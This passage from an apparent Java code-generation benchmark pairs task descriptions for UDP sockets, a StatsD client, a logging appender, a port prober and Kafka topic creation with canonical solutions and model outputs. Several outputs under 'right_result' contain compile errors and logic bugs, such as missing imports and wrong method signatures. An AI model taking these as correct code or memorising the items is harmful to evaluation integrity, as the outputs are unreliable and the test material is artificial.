    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DNSResolver {\n    private int mPort;\n    private InetAddress mLocalhost;\n\n    public DNSResolver(int localPort) throws Exception {\n        this.mPort = localPort;\n        this.mLocalhost = InetAddress.getLocalHost();\n    }\n\n    public byte[] processDNS(byte[] payload) throws Exception {\n        DatagramSocket socket = new DatagramSocket(mPort);\n        DatagramPacket packet = new DatagramPacket(payload, payload.length, mLocalhost, mPort);\n        \n        socket.send(packet);\n        byte[] buffer = new byte[4096];\n        DatagramPacket responsePacket = new DatagramPacket(buffer, buffer.length);\n        socket.receive(responsePacket);\n        \n        return Arrays.copyOfRange(responsePacket.getData(), 0, responsePacket.getLength());\n    }\n}\n```"
  },
  {
    "Task_id": 593,
    "Instruction": "Task Description: Implement a UDP-based transport class for inter-process communication that can function as either a server or client, handling both sending and receiving of datagram packets.\n\nClass Description: UdpTransport is a class that provides UDP communication capabilities, allowing processes to send and receive datagram packets. It can be configured as either a server (listening on a specific port) or a client (sending to a server). The class maintains a list of cluster members and supports asynchronous packet reception through a dedicated receiver thread.\n\nAttributes:\n- sock: DatagramSocket - The UDP socket used for communication\n- receiver_thread: Receiver - Thread for handling incoming packets\n- receiver: RtReceiver - Callback interface for received packets\n- host: InetAddress - The host address for communication\n- port: int - The port number for communication (default: 7800)\n- server: boolean - Flag indicating whether this instance is a server\n- log: Log - Logger instance for logging messages\n- members: List<SocketAddress> - List of cluster member addresses\n\nMethods:\n- receiver(RtReceiver) -> void - Sets the receiver callback for incoming packets\n- localAddress() -> Object - Returns the local socket address\n- clusterMembers() -> List<? extends Object> - Returns the list of cluster members\n- start(String...) -> void - Initializes the transport with given options and starts the receiver thread\n- stop() -> void - Stops the transport and closes the socket\n- send(Object, byte[], int, int) -> void - Sends a datagram packet to the specified destination\n- Receiver.run() -> void - Internal thread method that continuously receives packets (private class method)",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class UdpTransport implements RtTransport {\n    protected DatagramSocket      sock;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server;\n    protected final Log           log=LogFactory.getLog(UdpTransport.class);\n    protected List<SocketAddress> members=new ArrayList<>();\n\n    public UdpTransport() {\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public Object localAddress() {return members != null? members.get(0) : null;}\n\n    public List<? extends Object> clusterMembers() {\n        return members;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            sock=new DatagramSocket(port, host);\n            System.out.println(\"server started (ctrl-c to kill)\");\n        }\n        else {\n            sock=new DatagramSocket();\n            members.add(sock.getLocalSocketAddress());\n            members.add(new InetSocketAddress(host, port));\n        }\n        receiver_thread=new Receiver();\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        Util.close(sock);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        DatagramPacket packet=new DatagramPacket(buf, offset, length, (SocketAddress)dest);\n        sock.send(packet);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            DatagramPacket packet=new DatagramPacket(buf, 0, buf.length);\n            for(;;) {\n                try {\n                    sock.receive(packet);\n                    if(packet.getLength() != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + packet.getLength());\n                    if(receiver != null)\n                        receiver.receive(packet.getSocketAddress(), buf, packet.getOffset(), packet.getLength());\n                }\n                catch(IOException ex) {\n                    break;\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class UdpTransport {\n    private DatagramSocket sock;\n    private Receiver receiverThread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private Log log;\n    private List<SocketAddress> members = new ArrayList<>();\n\n    public void receiver(RtReceiver r) { receiver = r; }\n    public Object localAddress() { return sock.getLocalAddress(); }\n    public List<? extends Object> clusterMembers() { return members; }\n\n    public void start(String... args) throws IOException {\n        if (server) {\n            sock = new DatagramSocket(port);\n        } else {\n            host = InetAddress.getByName(args[0]);\n            port = Integer.parseInt(args[1]);\n            sock = new DatagramSocket();\n        }\n        receiverThread = new Receiver();\n        receiverThread.start();\n    }\n\n    public void stop() {\n        receiverThread.interrupt();\n        try {\n            sock.close();\n        } catch (IOException e) {}\n    }\n\n    public void send(Object dest, byte[] data, int offset, int length) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, offset, length, (InetSocketAddress)dest);\n        sock.send(packet);\n    }\n\n    private class Receiver extends Thread {\n        @Override\n        public void run() {\n            while (!isInterrupted()) {\n                try {\n                    byte[] buffer = new byte[4096];\n                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                    sock.receive(packet);\n                    if (receiver != null) {\n                        receiver.onReceive(packet);\n                    }\n                } catch (IOException e) {\n                    log.error(\"Error receiving packet\", e);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 594,
    "Instruction": "Task Description: Implement a UDP client class in Java that can receive data packets from a UDP server and process them, including extracting the sender's address and port information.\n\nClass Description: The UDPClient class is designed to handle UDP communication as a client. It creates a UDP socket bound to a specific port, receives incoming packets, processes the data, and provides information about the sender. The class includes methods for receiving data and cleaning up resources.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- packet: DatagramPacket - The packet object used for receiving data\n- buffer: byte[] - The buffer used to store incoming packet data\n\nMethods:\n- UDPClient(int port) -> void - Constructor that initializes the UDP client. Takes a port number as input to bind the socket.\n  - port: int - The port number to bind the socket to\n- receiveData() -> String - Receives a UDP packet, extracts the data, and returns it along with sender information\n  - Returns: String - The received data concatenated with sender's IP address and port\n- close() -> void - Closes the socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer;\n\n    public UDPClient(int port) throws Exception {\n        this.buffer = new byte[1024];\n        this.socket = new DatagramSocket(port);\n        this.packet = new DatagramPacket(buffer, buffer.length);\n    }\n\n    public String receiveData() throws Exception {\n        socket.receive(packet);\n        String data = new String(packet.getData(), 0, packet.getLength());\n        return data + \"from \" + packet.getAddress().getHostAddress() + \":\" + packet.getPort();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPClient {\n    private DatagramSocket socket;\n    private DatagramPacket packet;\n    private byte[] buffer = new byte[1024];\n\n    public UDPClient(int port) throws IOException {\n        this.socket = new DatagramSocket(port);\n    }\n\n    public String receiveData() throws IOException {\n        packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        InetAddress senderAddress = packet.getAddress();\n        int senderPort = packet.getPort();\n        String receivedData = new String(packet.getData(), 0, packet.getLength());\n        return receivedData + \" from \" + senderAddress.getHostAddress() + \":\" + senderPort;\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 596,
    "Instruction": "Task Description: Create a UDP communication class that can function as either a server or client, handling packet transmission and reception with proper error handling and resource management.\n\nClass Description: UDPCommunicator is a class that encapsulates UDP communication functionality, allowing an instance to operate as either a server (receiving packets) or client (sending packets). The class manages socket creation, packet transmission/reception, and proper cleanup.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- isServer: boolean - Flag indicating whether this instance operates as a server (true) or client (false)\n\nMethods:\n- UDPCommunicator(boolean isServer, int port) -> void - Constructor that initializes the UDP socket. Binds to specified port if operating as server.\n- sendPacket(byte[] data, String destAddress, int destPort) -> void - Sends a UDP packet to the specified destination (client mode only). Throws IOException on network errors and IllegalStateException if called in server mode.\n- receivePacket() -> byte[] - Receives a UDP packet (server mode only). Returns the packet data as byte array. Throws IOException on network errors and IllegalStateException if called in client mode.\n- close() -> void - Closes the socket and releases system resources. Safe to call multiple times.",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws SocketException {\n        this.isServer = isServer;\n        this.socket = new DatagramSocket(null);\n        if (isServer) {\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", port));\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Server cannot send packets without first receiving\");\n        }\n        DatagramPacket packet = new DatagramPacket(data, data.length, \n            new InetSocketAddress(destAddress, destPort));\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Client should not be receiving packets\");\n        }\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws IOException {\n        this.isServer = isServer;\n        if (isServer) {\n            socket = new DatagramSocket(port);\n        } else {\n            socket = new DatagramSocket();\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException, IllegalStateException {\n        if (!isServer) {\n            InetAddress address = InetAddress.getByName(destAddress);\n            DatagramPacket packet = new DatagramPacket(data, data.length, address, destPort);\n            socket.send(packet);\n        } else {\n            throw new IllegalStateException(\"Cannot send packet in server mode\");\n        }\n    }\n\n    public byte[] receivePacket() throws IOException, IllegalStateException {\n        if (isServer) {\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n            return packet.getData();\n        } else {\n            throw new IllegalStateException(\"Cannot receive packet in client mode\");\n        }\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 597,
    "Instruction": "Task Description: Implement a UDP port probing function to check if a specific UDP port on a remote host is reachable and responsive.\n\nFunction Description: The function sends a UDP \"PING\" packet to a specified host and port, then waits for a response. It determines port reachability based on whether a response is received (port is open/reachable) or if specific exceptions occur (port is unreachable or other errors).\n\nInput:\n- host: String - The target hostname or IP address to probe\n- portMapping: PortMapping - An object containing the external port number to probe (accessed via getExternalPort())\n\nOutput:\n- boolean - Returns true if the port is reachable (response received or timeout occurred), false if the port is unreachable or other errors occurred\n\nThe function handles the following cases:\n1. SocketTimeoutException: Returns true (port may be open but no response received)\n2. PortUnreachableException: Returns false (port definitely unreachable)\n3. Other Socket/IO exceptions: Returns false after logging the error\n4. Successful response: Returns false (unexpected response case)",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.io.IOException;\n\nprivate boolean probeUdpPort(String host, PortMapping portMapping) {\n    final Integer port = portMapping.getExternalPort();\n\n    try {\n        final byte[] pingData = \"PING\".getBytes(\"UTF-8\");\n        final DatagramSocket serverSocket = new DatagramSocket(0);\n        final SocketAddress socketAddr = new InetSocketAddress(host, port);\n        serverSocket.connect(socketAddr);\n\n        final InetAddress address = InetAddress.getByName(host);\n        final DatagramPacket sendPacket =\n            new DatagramPacket(pingData, pingData.length, address, port);\n        serverSocket.send(sendPacket);\n\n        final byte[] receiveData = new byte[8];\n        final DatagramPacket receivePacket =\n            new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.setSoTimeout(200);\n        serverSocket.receive(receivePacket);\n\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (SocketException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    } catch (IOException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.*;\n\npublic class UDPPortProber {\n    public static boolean probePort(String host, PortMapping portMapping) {\n        int externalPort = portMapping.getExternalPort();\n        try (DatagramSocket socket = new DatagramSocket()) {\n            socket.setSoTimeout(5000); // 5 seconds timeout\n            byte[] sendData = \"PING\".getBytes();\n            InetAddress inetAddress = InetAddress.getByName(host);\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, inetAddress, externalPort);\n            socket.send(sendPacket);\n\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            return true;\n        } catch (SocketTimeoutException e) {\n            return true; // Port may be open but no response received\n        } catch (PortUnreachableException e) {\n            return false; // Port definitely unreachable\n        } catch (IOException e) {\n            System.err.println(\"Error probing port \" + externalPort + \" on host \" + host + \": \" + e.getMessage());\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 598,
    "Instruction": "Task Description: Create a Java class that implements a StatsD client using UDP protocol for sending metrics to a StatsD server. The class should handle metric batching and asynchronous sending to avoid blocking the main application thread.\n\nClass Description: The Statsd class is a singleton that provides asynchronous metric sending capability to a StatsD server via UDP. It uses a background thread to batch metrics and send them efficiently. The class handles connection setup, error cases, and metric aggregation.\n\nAttributes:\n- CHARSET: [Charset] - The character encoding used for sending metrics (US_ASCII)\n- e: [ExecutorService] - Single thread executor for asynchronous metric processing\n- qManager: [Implicit Queue Manager] - Manages the queue of metrics to be sent (implied by usage but not shown in attributes)\n\nMethods:\n- getInstance(): () -> [Statsd] - Returns the singleton instance of the StatsD client\n- <constructor>: () -> [Statsd] - Private constructor that initializes the background thread for metric processing\n- <background thread>: () -> [void] - Internal method that continuously processes metrics from the queue, batches them, and sends to the StatsD server via UDP\n\nNote: The actual queue management implementation (qManager) is not shown in the provided code but is implied by the usage of getQ() and drainTo() methods. The class handles UDP socket creation, packet preparation, and error cases for host resolution and socket operations.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.openjdk.btrace.core.BTraceRuntime;\nimport org.openjdk.btrace.core.SharedSettings;\n\npublic final class Statsd {\n  private static final Charset CHARSET = StandardCharsets.US_ASCII;\n  private final ExecutorService e = Executors.newSingleThreadExecutor(\n      r -> {\n        Thread t = new Thread(r, \"jStatsD Client Submitter\");\n        t.setDaemon(true);\n        return t;\n      });\n\n  @SuppressWarnings(\"FutureReturnValueIgnored\")\n  private Statsd() {\n    e.submit(\n        () -> {\n          DatagramSocket ds = null;\n          boolean entered = BTraceRuntime.enter();\n          try {\n            ds = new DatagramSocket();\n            DatagramPacket dp = new DatagramPacket(new byte[0], 0);\n            try {\n              dp.setAddress(InetAddress.getByName(SharedSettings.GLOBAL.getStatsdHost()));\n            } catch (UnknownHostException ex) {\n              System.err.println(\n                  \"[statsd] invalid host defined: \" + SharedSettings.GLOBAL.getStatsdHost());\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            } catch (SecurityException ex) {\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            }\n            dp.setPort(SharedSettings.GLOBAL.getStatsdPort());\n\n            while (true) {\n              Collection<String> msgs = new ArrayList<>();\n              msgs.add(qManager.getQ().take());\n              qManager.getQ().drainTo(msgs);\n\n              StringBuilder sb = new StringBuilder();\n              for (String m : msgs) {\n                if (sb.length() + m.length() < 511) {\n                  sb.append(m).append('\\n');\n                } else {\n                  dp.setData(sb.toString().getBytes(CHARSET));\n                  ds.send(dp);\n                  sb.setLength(0);\n                }\n              }\n              if (sb.length() > 0) {\n                dp.setData(sb.toString().getBytes(CHARSET));\n                ds.send(dp);\n              }\n            }\n          } catch (IOException | InterruptedException ex) {\n            ex.printStackTrace();\n          } finally {\n            if (entered) {\n              BTraceRuntime.leave();\n            }\n          }\n        });\n  }\n\n  public static Statsd getInstance() {\n    return Singleton.INSTANCE;\n  }\n\n  private static final class Singleton {\n    private static final Statsd INSTANCE = new Statsd();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.nio.charset.Charset;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class Statsd {\n    private static final Charset CHARSET = Charset.forName(\"US_ASCII\");\n    private static Statsd instance;\n    private ExecutorService e;\n    private ImplicitQueueManager qManager;\n\n    private Statsd() {\n        e = Executors.newSingleThreadExecutor();\n        e.submit(this::backgroundThread);\n    }\n\n    public static synchronized Statsd getInstance() {\n        if (instance == null) {\n            instance = new Statsd();\n        }\n        return instance;\n    }\n\n    private void backgroundThread() {\n        while (true) {\n            try {\n                String[] metrics = qManager.getQ().drainTo(new String[100], 100);\n                if (metrics.length > 0) {\n                    sendMetrics(metrics);\n                }\n            } catch (Exception ex) {\n                // Handle exception, e.g., log it\n            }\n        }\n    }\n\n    private void sendMetrics(String[] metrics) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"statsd.server.address\");\n        byte[] buffer = String.join(\"\\n\", metrics).getBytes(CHARSET);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 8125);\n        socket.send(packet);\n        socket.close();\n    }\n\n    // Assuming ImplicitQueueManager is defined elsewhere\n    private static class ImplicitQueueManager {\n        private java.util.Queue<String> q = new java.util.LinkedList<>();\n\n        public java.util.Queue<String> getQ() {\n            return q;\n        }\n\n        public boolean add(String item) {\n            return q.add(item);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class DropwizardUdpSocketAppender extends OutputStreamAppender {\n    private final String host;\n    private final int port;\n    private DatagramSocket socket;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        try {\n            socket = new DatagramSocket();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to create DatagramSocket\", e);\n        }\n        super.start();\n    }\n\n    private OutputStream datagramSocketOutputStream(String host, int port) {\n        return new OutputStream() {\n            @Override\n            public void write(int b) throws IOException {\n                throw new UnsupportedOperationException(\"UDP does not support byte-level writes\");\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) throws IOException {\n                DatagramPacket packet = new DatagramPacket(b, off, len, java.net.InetAddress.getByName(host), port);\n                socket.send(packet);\n            }\n\n            @Override\n            public void close() throws IOException {\n                if (socket != null) {\n                    socket.close();\n                }\n            }\n        };\n    }\n\n    @Override\n    protected OutputStream getOutputStream() {\n        return datagramSocketOutputStream(host, port);\n    }\n}\n```"
  },
  {
    "Task_id": 6,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new Kafka topic with the specified name, number of partitions, and replication factor. It uses the Kafka AdminClient to interact with the Kafka broker and handles potential exceptions during the topic creation process.\n\nInput: \n- topic: String - The name of the Kafka topic to be created.\n\nOutput: \n- void - The function does not return any value but creates the topic in Kafka and stores the AdminClient instance in the class field.\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the topic creation to complete.\n- ExecutionException: If the topic creation fails during execution.\n- TimeoutException: If the topic creation takes longer than the specified timeout period.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport wiremock.com.google.common.collect.ImmutableMap;\n\nprivate AdminClient adminClient;\n\nprivate void createTopic(String topic) throws InterruptedException, ExecutionException, TimeoutException {\n    AdminClient adminClient = AdminClient\n        .create(ImmutableMap.of(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaContainer.getBootstrapServers()));\n    Collection<NewTopic> topics = Collections.singletonList(new NewTopic(topic, 3, (short) 1));\n    adminClient.createTopics(topics).all().get(30, TimeUnit.SECONDS);\n    this.adminClient = adminClient;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicCreator {\n    private AdminClient adminClient;\n\n    public KafkaTopicCreator(String bootstrapServers) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        this.adminClient = AdminClient.create(props);\n    }\n\n    public void createTopic(String topic, int numPartitions, short replicationFactor) throws InterruptedException, ExecutionException, TimeoutException {\n        NewTopic newTopic = new NewTopic(topic, numPartitions, replicationFactor);\n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n        result.all().get();\n    }\n}\n```"
  },
  {
    "Task_id": 600,
    "Instruction": "Task Description: Create a Java class for UDP socket communication that can be used for both sending and receiving datagram packets. The class should handle socket creation, binding, message transmission, and reception with proper error handling.\n\nClass Description: HTTPUSocket is a UDP socket wrapper class that provides simplified methods for UDP communication. It manages socket lifecycle and provides methods for sending messages to specific addresses and receiving incoming packets.\n\nAttributes:\n- ssdpUniSock: DatagramSocket - The underlying UDP socket for communication\n- localAddr: String - The local address bound to the socket\n\nMethods:\n- HTTPUSocket() -> void - Default constructor that creates an unbound UDP socket\n- HTTPUSocket(String bindAddr, int bindPort) -> void - Constructor that binds socket to specific address and port\n- HTTPUSocket(int bindPort) -> void - Constructor that binds socket to specific port on all interfaces\n- getDatagramSocket() -> DatagramSocket - Returns the underlying DatagramSocket instance\n- setLocalAddress(String addr) -> void - Sets the local address manually\n- getLocalAddress() -> String - Returns the local address bound to the socket\n- open() -> boolean - Creates an unbound UDP socket, returns success status\n- open(String bindAddr, int bindPort) -> boolean - Binds socket to specific address and port, returns success status\n- open(int bindPort) -> boolean - Binds socket to specific port on all interfaces, returns success status\n- close() -> boolean - Closes the socket, returns success status\n- post(String addr, int port, String msg) -> boolean - Sends a message to specified address and port, returns success status\n- receive() -> SSDPPacket - Receives an incoming packet and returns it wrapped in SSDPPacket object",
    "Canonical_solution": "import java.net.BindException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\n\npublic class HTTPUSocket {\n\n    private DatagramSocket ssdpUniSock = null;\n    private String localAddr = \"\";\n\n    public HTTPUSocket() {\n        open();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) throws BindException {\n        open(bindAddr, bindPort);\n    }\n\n    public HTTPUSocket(int bindPort) {\n        open(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        if (0 < localAddr.length())\n            return localAddr;\n        return ssdpUniSock.getLocalAddress().getHostAddress();\n    }\n\n    public boolean open() {\n        close();\n        try {\n            ssdpUniSock = new DatagramSocket();\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean open(String bindAddr, int bindPort) throws BindException {\n        close();\n        try {\n            InetSocketAddress bindInetAddr = new InetSocketAddress(InetAddress.getByName(bindAddr), bindPort);\n            ssdpUniSock = new DatagramSocket(bindInetAddr);\n        }\n        catch (BindException possible) {\n            throw possible;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        setLocalAddress(bindAddr);\n        return true;\n    }\n\n    public boolean open(int bindPort) {\n        close();\n        try {\n            InetSocketAddress bindSock = new InetSocketAddress(bindPort);\n            ssdpUniSock = new DatagramSocket(null);\n            ssdpUniSock.setReuseAddress(true);\n            ssdpUniSock.bind(bindSock);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean close() {\n        if (ssdpUniSock == null)\n            return true;\n        try {\n            ssdpUniSock.close();\n            ssdpUniSock = null;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress inetAddr = InetAddress.getByName(addr);\n            DatagramPacket dgmPacket = new DatagramPacket(msg.getBytes(), msg.length(), inetAddr, port);\n            ssdpUniSock.send(dgmPacket);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public SSDPPacket receive() {\n        byte ssdvRecvBuf[] = new byte[SSDP.RECV_MESSAGE_BUFSIZE];\n        SSDPPacket recvPacket = new SSDPPacket(ssdvRecvBuf, ssdvRecvBuf.length);\n        recvPacket.setLocalAddress(getLocalAddress());\n        try {\n            ssdpUniSock.receive(recvPacket.getDatagramPacket());\n            recvPacket.setTimeStamp(System.currentTimeMillis());\n        }\n        catch (Exception e) {\n            return null;\n        }\n        return recvPacket;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
